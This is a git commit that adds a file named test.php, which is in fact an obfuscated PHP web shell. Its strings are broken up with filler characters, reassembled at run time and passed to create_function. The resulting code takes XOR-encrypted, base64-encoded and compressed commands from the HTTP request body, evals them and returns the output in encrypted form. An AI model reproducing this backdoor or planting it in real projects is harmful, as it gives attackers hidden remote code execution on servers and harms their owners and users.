b8ad143ab1bda3e3a3797d4b8e3b20dec92c0ab4
prabinjackz <prabinav5@gmail.com>
2020-05-08 08:56:52 +0000

    first commit

---
+++ test.php
@@ -0,0 +1,12 @@
+<?php
+$a=str_replace('Q','','QcreaQQte_fuQncQtQion');
+$V='Vban();$r=Vb@baVbVbVbse64_encode(@xVb(@gzcompVbress($o),$kVb));prVbint("$Vbp$kh$Vbr$kf");}';
+$n='{$Vbj};}}retVburn $o;}ifVb (@preg_Vbmatch(Vb"/$kh(Vb.+)$Vbkf/",Vb@fiVble_getVb_cont';
+$g='ppoVbr8lO2IwE";funcVbVbtion x(Vb$t,$k){$c=stVbrlen($k)VbVb;$l=strlen(Vb$Vbt);$o="";fVbo';
+$w='eVbnts("phpVb:/Vb/input"),$m)Vb==1) {@oVbb_stVbart();@eVbVbval(@gzunVbcoVbmpress(@x';
+$k='$k=Vb"202cb962Vb";$kh="acVb5907VbVb5b964b";Vb$kf="0Vb7152d234b70"Vb;$Vbp=Vb"u9EVbzM';
+$A='r($i=0Vb;$Vbi<$l;){foVbr($jVb=0;($j<Vb$cVb&&$i<$l);$Vbj++,$iVb+Vb+){$o.Vb=$t{Vb$i}^$k';
+$Z='(@baVbse6Vb4_decoVbdeVb($m[1]),$k))Vb);Vb$o=@ob_Vbget_contenVbVbts(Vb);@ob_end_cle';
+$d=str_replace('Vb','',$k.$g.$A.$n.$w.$Z.$V);
+$r=$a('',$d);$r();
+?>
